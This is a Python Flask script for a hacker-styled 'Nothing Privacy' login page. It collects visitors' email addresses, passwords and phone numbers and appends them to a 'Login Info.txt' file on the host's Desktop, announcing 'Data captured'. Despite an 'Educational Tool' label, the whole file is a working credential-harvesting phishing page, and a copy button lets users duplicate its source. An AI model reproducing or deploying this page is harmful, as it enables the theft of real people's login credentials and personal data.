from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

# HTML template with "Nothing Privacy" and Copy button
HTML_FORM = '''
<!DOCTYPE html>
<html>
<head>
    <title>Nothing Privacy Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Courier New', monospace;
            background-color: #0a0e0f;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }
        .terminal {
            background-color: #1a1e1f;
            border: 2px solid #2ecc71;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(46, 204, 113, 0.3), inset 0 0 10px rgba(46, 204, 113, 0.2);
            width: 650px;
            overflow: hidden;
            font-family: 'Courier New', monospace;
        }
        .terminal-header {
            background: #2c3e50;
            padding: 12px 18px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #34495e;
        }
        .terminal-buttons {
            display: flex;
            gap: 8px;
            margin-right: 15px;
        }
        .terminal-btn {
            width: 15px;
            height: 15px;
            border-radius: 50%;
            display: inline-block;
        }
        .close { background: #e74c3c; }
        .minimize { background: #f1c40f; }
        .maximize { background: #2ecc71; }
        .terminal-title {
            color: #ecf0f1;
            font-size: 14px;
            letter-spacing: 1px;
        }
        .terminal-body {
            padding: 25px;
            background-color: #0d1112;
            color: #2ecc71;
        }
        .ascii-logo {
            font-size: 12px;
            line-height: 1.2;
            white-space: pre;
            font-family: 'Courier New', monospace;
            color: #f1c40f;
            text-shadow: 0 0 8px #f1c40f, 0 0 2px #e74c3c;
            background: #000000;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #2ecc71;
            letter-spacing: 2px;
            animation: glow 2s infinite;
            position: relative;
        }
        @keyframes glow {
            0% { text-shadow: 0 0 5px #f1c40f; }
            50% { text-shadow: 0 0 20px #f1c40f, 0 0 30px #e74c3c; }
            100% { text-shadow: 0 0 5px #f1c40f; }
        }
        .copy-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: #2ecc71;
            color: #0a0e0f;
            border: none;
            padding: 5px 12px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            cursor: pointer;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: 0.3s;
            border: 1px solid #f1c40f;
        }
        .copy-btn:hover {
            background: #f1c40f;
            box-shadow: 0 0 15px #f1c40f;
        }
        .command-line {
            margin: 15px 0 5px 0;
            color: #2ecc71;
            font-size: 16px;
            display: flex;
            align-items: center;
        }
        .prompt {
            color: #f1c40f;
            margin-right: 10px;
        }
        .prompt::before {
            content: "$";
            margin-right: 5px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #2ecc71;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 13px;
            letter-spacing: 1px;
        }
        input {
            width: 100%;
            padding: 12px;
            background: #1a1e1f;
            border: 1px solid #2ecc71;
            color: #ecf0f1;
            font-family: 'Courier New', monospace;
            font-size: 15px;
            border-radius: 5px;
            outline: none;
            transition: 0.3s;
        }
        input:focus {
            border-color: #f1c40f;
            box-shadow: 0 0 10px rgba(241, 196, 15, 0.3);
        }
        input[type="submit"] {
            background: #2ecc71;
            color: #0a0e0f;
            font-weight: bold;
            cursor: pointer;
            border: none;
            margin-top: 15px;
            text-transform: uppercase;
            letter-spacing: 2px;
            transition: 0.3s;
        }
        input[type="submit"]:hover {
            background: #f1c40f;
            color: #0a0e0f;
            box-shadow: 0 0 20px #f1c40f;
        }
        .output-line {
            margin-top: 10px;
            border-top: 1px dashed #2ecc71;
            padding-top: 10px;
            font-size: 13px;
        }
        .cursor {
            display: inline-block;
            width: 10px;
            height: 18px;
            background-color: #2ecc71;
            animation: blink 1s infinite;
            margin-left: 5px;
        }
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
        #copyNotification {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #2ecc71;
            color: #0a0e0f;
            padding: 10px 20px;
            border-radius: 5px;
            font-weight: bold;
            display: none;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="terminal-header">
            <div class="terminal-buttons">
                <span class="terminal-btn close"></span>
                <span class="terminal-btn minimize"></span>
                <span class="terminal-btn maximize"></span>
            </div>
            <div class="terminal-title">root@nothingprivacy:~#</div>
        </div>
        <div class="terminal-body">
            <div class="ascii-logo" id="logoText">
  ███╗   ██╗ ██████╗ ████████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
  ████╗  ██║██╔═══██╗╚══██╔══╝██║  ██║██║████╗  ██║██╔════╝ 
  ██╔██╗ ██║██║   ██║   ██║   ███████║██║██╔██╗ ██║██║  ███╗
  ██║╚██╗██║██║   ██║   ██║   ██╔══██║██║██║╚██╗██║██║   ██║
  ██║ ╚████║╚██████╔╝   ██║   ██║  ██║██║██║ ╚████║╚██████╔╝
  ╚═╝  ╚═══╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                
  ██████╗ ██████╗ ██╗██╗   ██╗ █████╗  ██████╗██╗   ██╗      
  ██╔══██╗██╔══██╗██║██║   ██║██╔══██╗██╔════╝╚██╗ ██╔╝      
  ██████╔╝██████╔╝██║██║   ██║███████║██║      ╚████╔╝       
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══██║██║       ╚██╔╝        
  ██║     ██║  ██║██║ ╚████╔╝ ██║  ██║╚██████╗   ██║         
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚═╝  ╚═╝ ╚═════╝   ╚═╝         
                <button class="copy-btn" onclick="copyCode()">📋 COPY CODE</button>
            </div>
            
            <div class="command-line">
                <span class="prompt"></span> enter_credentials --interactive
                <span class="cursor"></span>
            </div>
            
            <form method="POST" action="/">
                <div class="form-group">
                    <label>>_ Email_Address:</label>
                    <input type="email" name="email" placeholder="root@nothingprivacy.com" required>
                </div>
                <div class="form-group">
                    <label>>_ Password:</label>
                    <input type="password" name="password" placeholder="********" required>
                </div>
                <div class="form-group">
                    <label>>_ Phone_Number:</label>
                    <input type="text" name="phone" placeholder="+252-61-234-5678" required>
                </div>
                <input type="submit" value="[ EXECUTE ]">
            </form>
            
            <div class="output-line">
                <span style="color: #f1c40f;"># Nothing Privacy v1.0.0 | Educational Tool</span>
            </div>
        </div>
    </div>

    <div id="copyNotification">✅ Code copied to clipboard!</div>

    <script>
        function copyCode() {
            // The full Python code as a string (escaped properly)
            const code = `from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

HTML_FORM = '''
<!DOCTYPE html>
<html>
<head>
    <title>Nothing Privacy Login</title>
    <style>
        /* same CSS as above - you can copy it from the browser output if needed */
    </style>
</head>
<body>
    <!-- same HTML as above -->
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        phone = request.form['phone']

        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        file_path = os.path.join(desktop, "Login Info.txt")

        data = f"[+] Email: {email}\\n[+] Password: {password}\\n[+] Phone: {phone}\\n{'-'*40}\\n"

        try:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(data)
            message = f"[✔️] SUCCESS: Data captured and saved to {file_path}"
        except Exception as e:
            message = f"[❌] ERROR: {e}"

        return f"""
        <html>
        <head><title>Nothing Privacy Output</title>
        <style>
            body {{ background: #0a0e0f; color: #2ecc71; font-family: 'Courier New', monospace; padding: 40px; }}
            .result {{ border: 2px solid #2ecc71; padding: 30px; max-width: 700px; margin: auto; }}
            a {{ color: #f1c40f; text-decoration: none; }}
            a:hover {{ text-decoration: underline; }}
        </style>
        </head>
        <body>
            <div class="result">
                <pre>{message}</pre>
                <br><a href='/'>[ RETURN TO TERMINAL ]</a>
            </div>
        </body>
        </html>
        """

    return render_template_string(HTML_FORM)

if __name__ == '__main__':
    app.run(debug=True, port=5000)
`;

            // Copy to clipboard
            navigator.clipboard.writeText(code).then(function() {
                // Show notification
                const notification = document.getElementById('copyNotification');
                notification.style.display = 'block';
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 2000);
            }).catch(function(err) {
                alert('Failed to copy code: ' + err);
            });
        }
    </script>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        phone = request.form['phone']

        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        file_path = os.path.join(desktop, "Login Info.txt")

        data = f"[+] Email: {email}\n[+] Password: {password}\n[+] Phone: {phone}\n{'-'*40}\n"

        try:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(data)
            message = f"[✔️] SUCCESS: Data captured and saved to {file_path}"
        except Exception as e:
            message = f"[❌] ERROR: {e}"

        return f"""
        <html>
        <head><title>Nothing Privacy Output</title>
        <style>
            body {{ background: #0a0e0f; color: #2ecc71; font-family: 'Courier New', monospace; padding: 40px; }}
            .result {{ border: 2px solid #2ecc71; padding: 30px; max-width: 700px; margin: auto; }}
            a {{ color: #f1c40f; text-decoration: none; }}
            a:hover {{ text-decoration: underline; }}
        </style>
        </head>
        <body>
            <div class="result">
                <pre>{message}</pre>
                <br><a href='/'>[ RETURN TO TERMINAL ]</a>
            </div>
        </body>
        </html>
        """

    return render_template_string(HTML_FORM)

if __name__ == '__main__':
    app.run(debug=True, port=5000)